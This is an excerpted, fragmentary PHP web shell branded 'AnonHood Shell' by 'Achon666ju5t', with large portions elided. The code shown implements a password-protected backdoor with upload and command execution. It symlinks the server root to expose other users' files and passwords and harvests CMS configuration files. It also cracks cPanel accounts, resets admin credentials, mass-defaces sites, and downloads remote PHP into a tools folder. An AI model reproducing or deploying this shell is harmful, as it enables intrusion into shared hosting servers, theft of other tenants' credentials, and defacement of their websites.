...
<html>
<head>
<title>AnonHood Shell</title>
<link href='http://www.pngmart.com/files/5/Anonymous-PNG-Transparent-Image.png' rel='icon' type='image/x-icon'/>
<meta name='author' content='Achon666ju5t'>
<blink>
<meta charset="UTF-8">
<style type='text/css'>
...
input[type=text], input[type=password],input[type=submit] {
    ...
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #ff0000; } 
    </style> 
    <center>
<br><br><br>
<img src="http://www.pngmart.com/files/5/Anonymous-PNG-Transparent-Image.png" width="150" height="150"</img>  
    <br><font size="5"><font color="red">ABSH</font> Priv8 Shell<br>-=Anonymous Brotherhood Security Hackers=-<br>Enter the Password<br></font><form method=post> 
    <input type=password name=Monkey> 
    </form></center> 
    <?php 
...
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $lol ) || 
        ( isset( $_POST['Monkey'] ) && ( md5($_POST['Monkey']) == $lol ) ) ) 
...
$c = "/chonx_tools/".$names.".php";
if (file_exists('chonx_tools/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "chonx_tools/'.$names.'.php";</script> ';
	}
	else {mkdir("chonx_tools", 0777);
file_put_contents('chonx_tools/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "chonx_tools/'.$names.'.php";</script> ';}}}
...
if($_GET['do'] == 'upload') {
 ...
 elseif($_GET['do'] == 'cmd') {
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Achon666ju5t</textarea><br>
...
elseif($_GET['do'] == 'about') {
    ...
    echo '<center>Achon666ju5t - Extreme Crew';
...
if($_POST['gass']) {
	...
	echo"</textarea><br>
		...
		<form method='post'>
		Link Config: <br>
		<input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/chonx_symconf/'><br>
...
@mkdir("chonx_symconf", 0777);
@chdir("chonx_symconf");
@symlink("/","root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex janchonx.htm
...
$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/chonx_symconf/";
$re=$r;
...
echo "<center>
<a href=\"chonx_symconf/root/\">Root Server</a>
<br><a href=\"chonx_symconf/Passwords.txt\">Passwords</a>
<br><a href=\"chonx_symconf/\">Configurations</a></center>";
}
else
{
echo "<center>
...
<td>".$user['name']."</td>
<td><a href='$full/chonx_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/chonx_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("chonx_sym",0777);@chdir("chonx_sym");@exe("ln -s / root");$file3 = '
...
elseif($_GET['do'] == 'config') {
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("chonx_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("chonx_config/.htaccess","w");
		fwrite($htc, $isi_htc);
				...
				$grab_config = array(
					...
					foreach($grab_config as $config => $nama_config) {
						...
						if($ambil_config == '') {
							...
							$file_config = fopen("chonx_config/$user_chonx-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a href='?dir=$dir/chonx_config'><font color=lime>Done</font></a></center>";
			}else{
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='achonx' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='achonx' placeholder='pass_baru'><br>
 ...
 elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>Nemu ".$i." Cpanel by <font color=lime>Janchonx</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By Achon666ju5t' placeholder='New Title'><br><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>Sukses Deface ".$i." Cpanel by <font color=lime>Janchonx.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
...
//
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By Achon666ju5t' required><br>
